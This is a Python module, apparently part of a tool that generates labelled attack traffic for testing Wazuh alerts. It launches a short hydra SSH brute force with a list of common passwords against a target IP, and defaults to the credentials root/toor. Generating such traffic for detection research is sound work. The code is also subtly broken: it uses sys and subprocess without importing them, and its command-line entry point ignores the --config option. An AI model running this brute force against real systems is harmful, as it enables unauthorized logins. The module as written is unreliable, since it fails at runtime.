# Module de bruteforce SSH.
#
# Utilise hydra pour tenter une petite serie d'echecs de connexion contre
# le service SSH de la cible. Le nom d'utilisateur vient de la config
# (un compte de test dedie). Un melange de mots de passe corrects et
# incorrects est envoye pour que Wazuh voie des echecs d'authentification
# melanges a des succes occasionnels.
#
# La rafale est deliberateument courte : 10 a 30 tentatives max, pour que
# le volume d'alertes reste realiste et ne submerge pas le manager Wazuh.

from datetime import datetime, timezone
import random

sys.path.insert(0, "..")

from utils.logger import record_label, log_run


def run(target_ip, config, label_file="labels.csv"):
    """Execute une courte rafale de bruteforce SSH via hydra.

    Cles de configuration utilisees :
        - target_ssh_port (int, default 22)
        - target_ssh_user (str)
        - target_ssh_pass (str)
        - burst.bruteforce_attempts (int, default 30)
        - intensity.bruteforce (int, attempts/second)
    """
    ssh_port = config.get("target_ssh_port", 22)
    ssh_user = config.get("target_ssh_user", "root")
    ssh_pass = config.get("target_ssh_pass", "toor")
    max_attempts = config.get("burst", {}).get("bruteforce_attempts", 30)
    rate = config.get("intensity", {}).get("bruteforce", 5)

    # Build a wordlist with mostly wrong passwords and one correct one.
    # Hydra reads one password per line; the correct one goes at a random
    # position in the middle, not first or last, to look more realistic.
    wrong_pwds = ["123456", "admin", "password", "root", "toor", "qwerty",
                  "letmein", "welcome", "Passw0rd", "test", "user", "default",
                  "changeme", "Pa$$w0rd", "p@ssw0rd"]
    wrong_pwds = random.sample(wrong_pwds, min(max_attempts - 1, len(wrong_pwds)))
    insert_pos = random.randint(1, len(wrong_pwds) - 1)
    wrong_pwds.insert(insert_pos, ssh_pass)
    wordlist_path = "/tmp/tg_bruteforce_wordlist.txt"
    with open(wordlist_path, "w") as f:
        for pwd in wrong_pwds:
            f.write(pwd + "\n")

    start_ts = datetime.now(timezone.utc)
    logfile = log_run("bruteforce")

    try:
        cmd = [
            "hydra", "-l", ssh_user, "-P", wordlist_path,
            "-s", str(ssh_port),
            "-t", str(min(rate, 4)),  # cap threads to 4 so we don't flood
            "-o", "/dev/null",
            "-f",                      # stop on first found password
            "-w", "10",
            f"ssh://{target_ip}",
        ]
        subprocess.run(cmd, stdout=logfile, stderr=logfile,
                       timeout=60, check=False)
    except FileNotFoundError:
        print("  [WARN] hydra not installed. Install with: sudo apt install hydra")
        return False
    except subprocess.TimeoutExpired:
        print("  [WARN] hydra timed out")
    except Exception as e:
        print(f"  [ERROR] hydra: {e}")
        return False
    finally:
        logfile.close()
        import os
        try:
            os.remove(wordlist_path)
        except OSError:
            pass

    end_ts = datetime.now(timezone.utc)

    record_label(
        label_class="bruteforce",
        module_name="bruteforce",
        tool_used="hydra",
        target_ip=target_ip,
        start_ts=start_ts,
        end_ts=end_ts,
        label_file=label_file,
        extra_params={"ssh_user": ssh_user, "attempts": len(wrong_pwds)},
    )

    print(f"  bruteforce ({len(wrong_pwds)} attempts, user={ssh_user}) -> {target_ip}  OK")
    return True


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    parser.add_argument("--config", default="{}")
    parser.add_argument("--out", default="labels.csv")
    args = parser.parse_args()
    run(args.target, {}, label_file=args.out)
